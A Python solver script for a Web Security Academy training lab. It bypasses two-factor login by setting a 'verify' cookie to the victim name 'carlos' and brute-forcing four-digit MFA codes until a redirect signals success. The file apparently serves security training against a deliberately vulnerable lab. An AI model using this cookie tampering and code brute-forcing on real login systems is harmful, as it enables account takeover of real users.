from web_security_academy.core.utils import *
from bs4 import BeautifulSoup


def solve_lab(session):
    # This lab doesn't verify that the initial login step was completed.
    # Therefore, we can visit "/login2" and send generate a security code
    # to log in as carlos. From there we can brute-force the security code.

    session.cookies.set("verify", "carlos")
    print_info(
        'Generating a security code for "carlos" by visiting "/login2" with the following cookies:'
    )
    print(session.cookies.get_dict(), end="\n\n")
    session.get_path("/login2")

    print_info("Brute-forcing the security code... (Range: 0000 - 1999)")
    for i in range(2000):
        data = {"mfa-code": f"{i:04d}"}
        resp = session.post_path("/login2", data=data, allow_redirects=False)

        if resp.status_code != 302:
            print_info_secondary(f"{i:04d} => Incorrect", end="\x1b[1K")
        else:
            print_success(f"{i:04d} => Correct!\n")
            session.post_path("/login2", data=data)
            break
    else:
        print_fail("Unable to brute-force security code.")
